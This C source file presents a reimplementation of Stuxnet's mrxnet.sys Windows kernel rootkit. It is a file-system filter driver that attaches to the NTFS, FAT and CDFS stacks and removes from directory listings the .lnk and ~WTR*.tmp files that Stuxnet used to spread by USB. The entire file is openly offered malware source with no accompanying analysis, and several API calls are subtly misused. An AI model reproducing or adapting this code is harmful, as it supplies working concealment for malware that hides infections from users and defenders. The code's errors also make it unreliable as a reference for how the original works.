/*
 * Missing_3.c - mrxnet.sys Rootkit Driver (Complete Implementation)
 *
 * Based on Symantec W32.Stuxnet Dossier and public reverse engineering analysis
 * References:
 * - https://bbs.kanxue.com/article-635.htm
 * - https://malwareanalysisspace.blogspot.com/2026/06/revisiting-stuxnet-research-notes.html
 * - https://ost.fyi/Rootkits_files/Rootkits-Part2.ppt.pdf
 */

#include <ntddk.h>
#include <ntifs.h>

#define POOL_TAG 'lnCx'

#define HIDDEN_LNK_SIZE 0x104B

#define MIN_HIDDEN_TMP_SIZE 0x1000
#define MAX_HIDDEN_TMP_SIZE 0x800000

#define FILE_DEVICE_DISK_FILE_SYSTEM 0x00000009
#define FILE_DEVICE_SECURE_OPEN 0x00000100

/*
 * Device Extension structure
 * Contains pointers to the lower and real device objects
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
typedef struct _MRXNET_DEVICE_EXTENSION {
    PDEVICE_OBJECT LowerDevice;
    PDEVICE_OBJECT RealDevice;
} MRXNET_DEVICE_EXTENSION, * PMRXNET_DEVICE_EXTENSION;

/*
 * Function pointer for ObReferenceObjectByName
 * Dynamically resolved at runtime
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
typedef NTSTATUS (*OB_REFERENCE_OBJECT_BY_NAME)(
    PUNICODE_STRING ObjectName,
    ULONG Attributes,
    PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID ParseContext,
    PVOID *Object
);

static PDRIVER_OBJECT g_pDriverObject = NULL;
static OB_REFERENCE_OBJECT_BY_NAME g_pObReferenceObjectByName = NULL;

/*
 * Checks if a file should be hidden based on Stuxnet's rules
 * Reference: https://malwareanalysisspace.blogspot.com/2026/06/revisiting-stuxnet-research-notes.html
 */
static BOOLEAN IsFileHidden(PFILE_DIRECTORY_INFORMATION pDirInfo) {
    UNICODE_STRING ustrFileName;
    WCHAR *pExt;
    DWORD i, sum = 0;

    if (!pDirInfo || pDirInfo->FileNameLength == 0) {
        return FALSE;
    }

    ustrFileName.Buffer = pDirInfo->FileName;
    ustrFileName.Length = (USHORT)pDirInfo->FileNameLength;
    ustrFileName.MaximumLength = (USHORT)pDirInfo->FileNameLength;

    if (ustrFileName.Length >= 4 * sizeof(WCHAR)) {
        pExt = &ustrFileName.Buffer[ustrFileName.Length / sizeof(WCHAR) - 4];

        if (*pExt == L'.') {
            UNICODE_STRING ustrExt;
            RtlInitUnicodeString(&ustrExt, pExt);

            if (RtlCompareUnicodeString(&ustrExt, L".lnk", TRUE) == 0) {
                if (pDirInfo->EndOfFile.LowPart == HIDDEN_LNK_SIZE) {
                    return TRUE;
                }
            }
        }
    }

    if (ustrFileName.Length >= 8 * sizeof(WCHAR)) {
        WCHAR *pName = ustrFileName.Buffer;

        if (pName[0] == L'~' && pName[1] == L'W' && pName[2] == L'T' && pName[3] == L'R') {
            if (ustrFileName.Length >= 12 * sizeof(WCHAR)) {
                for (i = 0; i < 4; i++) {
                    if (pName[4 + i] >= L'0' && pName[4 + i] <= L'9') {
                        sum += (pName[4 + i] - L'0');
                    } else {
                        return FALSE;
                    }
                }

                if (sum % 10 == 0) {
                    if (pDirInfo->EndOfFile.LowPart >= MIN_HIDDEN_TMP_SIZE &&
                        pDirInfo->EndOfFile.LowPart <= MAX_HIDDEN_TMP_SIZE) {
                        return TRUE;
                    }
                }
            }
        }
    }

    return FALSE;
}

/*
 * Filters directory entries by removing hidden files from the result list
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static NTSTATUS FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOLEAN bFound;

    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }

    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }

    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;

    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;

        if (IsFileHidden(pCurrent)) {
            bFound = TRUE;

            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);

                if (pPrev == NULL) {
                    RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                    ulRemaining -= pCurrent->NextEntryOffset;
                    continue;
                } else {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = pNext;
                    ulRemaining -= ulEntrySize;
                    continue;
                }
            } else {
                if (pPrev != NULL) {
                    pPrev->NextEntryOffset = 0;
                }
                ulRemaining = 0;
                break;
            }
        }

        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }

    if (bFound) {
        *pReturnLength = ulNewLength;
    }

    return STATUS_SUCCESS;
}

/*
 * IRP_MJ_DIRECTORY_CONTROL dispatch routine
 * Intercepts directory queries and filters hidden files
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static NTSTATUS DirControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PIO_STACK_LOCATION pStack;
    NTSTATUS status;
    PVOID pFileInfo;
    ULONG ulLength;
    FILE_INFORMATION_CLASS InfoClass;
    PULONG pReturnLength;

    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }

    PMRXNET_DEVICE_EXTENSION pExt = (PMRXNET_DEVICE_EXTENSION)pDeviceObject->DeviceExtension;

    if (!pExt || !pExt->LowerDevice) {
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }

    pStack = IoGetCurrentIrpStackLocation(pIrp);

    if (!pStack || pStack->MajorFunction != IRP_MJ_DIRECTORY_CONTROL) {
        IoSkipCurrentIrpStackLocation(pIrp);
        return IoCallDriver(pExt->LowerDevice, pIrp);
    }

    IoCopyCurrentIrpStackLocationToNext(pIrp);
    status = IoCallDriver(pExt->LowerDevice, pIrp);

    if (!NT_SUCCESS(status) || !pIrp->IoStatus.Information) {
        return status;
    }

    if (pStack->MinorFunction == IRP_MN_QUERY_DIRECTORY) {
        pFileInfo = pIrp->AssociatedIrp.SystemBuffer;
        ulLength = (ULONG)pIrp->IoStatus.Information;
        InfoClass = pStack->Parameters.QueryDirectory.FileInformationClass;
        pReturnLength = &pIrp->IoStatus.Information;

        FilterDirectoryEntries(pFileInfo, ulLength, InfoClass, pReturnLength);
    }

    return status;
}

/*
 * IRP_MJ_FILE_SYSTEM_CONTROL dispatch routine
 * Passes through to the lower device
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static NTSTATUS FileSystemControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PMRXNET_DEVICE_EXTENSION pExt;

    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }

    pExt = (PMRXNET_DEVICE_EXTENSION)pDeviceObject->DeviceExtension;

    if (!pExt || !pExt->LowerDevice) {
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }

    IoSkipCurrentIrpStackLocation(pIrp);
    return IoCallDriver(pExt->LowerDevice, pIrp);
}

/*
 * Generic dispatch routine for all other IRPs
 * Passes through to the lower device
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static NTSTATUS DispatchPassThrough(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PMRXNET_DEVICE_EXTENSION pExt;

    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }

    pExt = (PMRXNET_DEVICE_EXTENSION)pDeviceObject->DeviceExtension;

    if (!pExt || !pExt->LowerDevice) {
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }

    IoSkipCurrentIrpStackLocation(pIrp);
    return IoCallDriver(pExt->LowerDevice, pIrp);
}

/*
 * Fast I/O routines - all return FALSE to force IRP path
 * This ensures all file operations go through our IRP filter
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static BOOLEAN FastIoCheckIfPossible(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    BOOLEAN CheckForReadOperation,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoRead(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    ULONG LockKey,
    PVOID Buffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoWrite(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    ULONG LockKey,
    PVOID Buffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoQueryBasicInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_BASIC_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoQueryStandardInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_STANDARD_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoLock(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PLARGE_INTEGER pLength,
    PEPROCESS pProcess,
    ULONG Key,
    BOOLEAN FailImmediately,
    BOOLEAN ExclusiveLock,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoUnlockSingle(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PLARGE_INTEGER pLength,
    PEPROCESS pProcess,
    ULONG Key,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoUnlockAll(
    PFILE_OBJECT pFileObject,
    PEPROCESS pProcess,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoUnlockAllByKey(
    PFILE_OBJECT pFileObject,
    PVOID pProcess,
    ULONG Key,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoDeviceControl(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PVOID pInputBuffer,
    ULONG InputBufferLength,
    ULONG IoControlCode,
    PVOID pOutputBuffer,
    ULONG OutputBufferLength,
    ULONG *pBytesReturned,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoDetachDevice(
    PDEVICE_OBJECT pSourceDevice,
    PDEVICE_OBJECT pTargetDevice
) {
    return FALSE;
}

static BOOLEAN FastIoQueryNetworkOpenInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_NETWORK_OPEN_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN MdlRead(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN MdlReadComplete(
    PFILE_OBJECT pFileObject,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN PrepareMdlWrite(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PMDL *ppMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN MdlWriteComplete(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoReadCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PVOID Buffer,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoWriteCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PVOID Buffer,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN MdlReadCompleteCompressed(
    PFILE_OBJECT pFileObject,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN MdlWriteCompleteCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

static BOOLEAN FastIoQueryOpen(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_NETWORK_OPEN_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    return FALSE;
}

/*
 * Fills the Fast I/O dispatch table
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static VOID FillFastIoDispatch(PFAST_IO_DISPATCH pFastIoDispatch) {
    if (!pFastIoDispatch) {
        return;
    }

    pFastIoDispatch->FastIoCheckIfPossible = FastIoCheckIfPossible;
    pFastIoDispatch->FastIoRead = FastIoRead;
    pFastIoDispatch->FastIoWrite = FastIoWrite;
    pFastIoDispatch->FastIoQueryBasicInfo = FastIoQueryBasicInfo;
    pFastIoDispatch->FastIoQueryStandardInfo = FastIoQueryStandardInfo;
    pFastIoDispatch->FastIoLock = FastIoLock;
    pFastIoDispatch->FastIoUnlockSingle = FastIoUnlockSingle;
    pFastIoDispatch->FastIoUnlockAll = FastIoUnlockAll;
    pFastIoDispatch->FastIoUnlockAllByKey = FastIoUnlockAllByKey;
    pFastIoDispatch->FastIoDeviceControl = FastIoDeviceControl;
    pFastIoDispatch->FastIoDetachDevice = FastIoDetachDevice;
    pFastIoDispatch->FastIoQueryNetworkOpenInfo = FastIoQueryNetworkOpenInfo;
    pFastIoDispatch->MdlRead = MdlRead;
    pFastIoDispatch->MdlReadComplete = MdlReadComplete;
    pFastIoDispatch->PrepareMdlWrite = PrepareMdlWrite;
    pFastIoDispatch->MdlWriteComplete = MdlWriteComplete;
    pFastIoDispatch->FastIoReadCompressed = FastIoReadCompressed;
    pFastIoDispatch->FastIoWriteCompressed = FastIoWriteCompressed;
    pFastIoDispatch->MdlReadCompleteCompressed = MdlReadCompleteCompressed;
    pFastIoDispatch->MdlWriteCompleteCompressed = MdlWriteCompleteCompressed;
    pFastIoDispatch->FastIoQueryOpen = FastIoQueryOpen;
}

/*
 * Attaches to file system driver objects
 * Uses ObReferenceObjectByName to get file system driver objects
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
static NTSTATUS AttachTargetDrivers(PDRIVER_OBJECT pDriverObject) {
    UNICODE_STRING ustrNtfs, ustrFastFat, ustrCdfs;
    PDEVICE_OBJECT pDeviceObject, pLowerDevice;
    NTSTATUS status;

    RtlInitUnicodeString(&ustrNtfs, L"\\FileSystem\\ntfs");
    RtlInitUnicodeString(&ustrFastFat, L"\\FileSystem\\fastfat");
    RtlInitUnicodeString(&ustrCdfs, L"\\FileSystem\\cdfs");

    if (!g_pObReferenceObjectByName) {
        return STATUS_UNSUCCESSFUL;
    }

    status = g_pObReferenceObjectByName(&ustrNtfs, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&pDeviceObject);
    if (NT_SUCCESS(status) && pDeviceObject) {
        pLowerDevice = IoAttachDeviceToDeviceStack(pDeviceObject, pDriverObject->DeviceObject);
        if (pLowerDevice) {
            PMRXNET_DEVICE_EXTENSION pExt = (PMRXNET_DEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
            pExt->LowerDevice = pLowerDevice;
            pExt->RealDevice = pDeviceObject;
        }
        ObDereferenceObject(pDeviceObject);
    }

    status = g_pObReferenceObjectByName(&ustrFastFat, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&pDeviceObject);
    if (NT_SUCCESS(status) && pDeviceObject) {
        IoAttachDeviceToDeviceStack(pDeviceObject, pDriverObject->DeviceObject);
        ObDereferenceObject(pDeviceObject);
    }

    status = g_pObReferenceObjectByName(&ustrCdfs, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&pDeviceObject);
    if (NT_SUCCESS(status) && pDeviceObject) {
        IoAttachDeviceToDeviceStack(pDeviceObject, pDriverObject->DeviceObject);
        ObDereferenceObject(pDeviceObject);
    }

    return STATUS_SUCCESS;
}

/*
 * Driver unload routine
 * Detaches from file system devices and deletes the device object
 */
static VOID DriverUnload(PDRIVER_OBJECT pDriverObject) {
    PMRXNET_DEVICE_EXTENSION pExt;

    if (!pDriverObject) {
        return;
    }

    pExt = (PMRXNET_DEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

    if (pExt && pExt->RealDevice && pExt->LowerDevice) {
        IoDetachDevice(pExt->LowerDevice);
    }

    if (pDriverObject->DeviceObject) {
        IoDeleteDevice(pDriverObject->DeviceObject);
    }

    if (pDriverObject->FastIoDispatch) {
        ExFreePoolWithTag(pDriverObject->FastIoDispatch, POOL_TAG);
        pDriverObject->FastIoDispatch = NULL;
    }

    DbgPrint("MRXNET: Driver unloaded\n");
}

/*
 * Driver entry point
 * Reference: https://bbs.kanxue.com/article-635.htm
 */
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
    NTSTATUS status;
    PDEVICE_OBJECT pDeviceObject;
    UNICODE_STRING ustrDeviceName;
    PFAST_IO_DISPATCH pFastIoDispatch;
    ULONG i;

    DbgPrint("MRXNET: Driver loading...\n");

    g_pDriverObject = pDriverObject;

    RtlInitUnicodeString(&ustrDeviceName, NULL);

    status = IoCreateDevice(
        pDriverObject,
        sizeof(MRXNET_DEVICE_EXTENSION),
        &ustrDeviceName,
        FILE_DEVICE_DISK_FILE_SYSTEM,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pDeviceObject
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("MRXNET: IoCreateDevice failed (0x%08X)\n", status);
        return status;
    }

    pDeviceObject->Flags |= DO_BUFFERED_IO;

    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        pDriverObject->MajorFunction[i] = DispatchPassThrough;
    }

    pDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = FileSystemControl;
    pDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = DirControl;

    pFastIoDispatch = (PFAST_IO_DISPATCH)ExAllocatePoolWithTag(NonPagedPool, sizeof(FAST_IO_DISPATCH), POOL_TAG);
    if (pFastIoDispatch) {
        RtlZeroMemory(pFastIoDispatch, sizeof(FAST_IO_DISPATCH));
        FillFastIoDispatch(pFastIoDispatch);
        pDriverObject->FastIoDispatch = pFastIoDispatch;
    }

    g_pObReferenceObjectByName = (OB_REFERENCE_OBJECT_BY_NAME)MmGetSystemRoutineAddress(&(UNICODE_STRING)RTL_CONSTANT_STRING(L"ObReferenceObjectByName"));

    if (g_pObReferenceObjectByName) {
        AttachTargetDrivers(pDriverObject);
    }

    pDriverObject->DriverUnload = DriverUnload;

    DbgPrint("MRXNET: Driver loaded successfully\n");

    return STATUS_SUCCESS;
}